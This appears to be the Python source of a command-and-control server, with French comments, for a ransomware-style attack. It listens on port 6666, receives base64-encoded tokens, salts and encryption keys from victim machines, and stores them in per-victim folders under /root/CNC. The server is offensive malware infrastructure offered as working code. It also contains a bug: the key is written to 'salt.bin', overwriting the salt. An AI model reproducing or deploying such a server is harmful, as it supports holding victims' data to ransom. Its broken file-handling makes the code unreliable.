import base64
from hashlib import sha256
from http.server import HTTPServer
import os

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, path:str, params:dict, body:dict)->dict:

        # Décodage du token
        token = base64.b64decode(body["token"]) 
        # Hashage du token
        hash_token = sha256(token)
        # Transforme le token en string
        str_token = hash_token.hexdigest()

        # Décodage du salt
        salt = base64.b64decode(body["salt"]) 
        
        # Décodage de la clé
        key = base64.b64decode(body["key"]) 

        # Création du chemin jusqu'au dossier créé grâce au token haché en string
        directory_token = os.path.join(self.ROOT_PATH, str_token)

        # Création du dossier avec le token haché
        # os.makedirs génère les dossiers intermédiaires si nécessaire, 
        # os.mkdir non
        os.makedirs(directory_token, exist_ok=True) 

        # Création du chemin pour le fichier salt.bin
        chemin_pour_salt_dot_bin = os.path.join(directory_token, "salt.bin")
        # Ecriture du fichier salt.bin
        fichier_salt_dot_bin = open(chemin_pour_salt_dot_bin, "wb")
        fichier_salt_dot_bin.write(salt)
        fichier_salt_dot_bin.close()
        
        # Création du chemin pour le fichier key.bin
        chemin_pour_key_dot_bin = os.path.join(directory_token, "salt.bin")
        # Ecriture du fichier key.bin
        fichier_key_dot_bin = open(chemin_pour_key_dot_bin, "wb")
        fichier_key_dot_bin.write(key)
        fichier_key_dot_bin.close()

        return {"status":"OK"}

           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()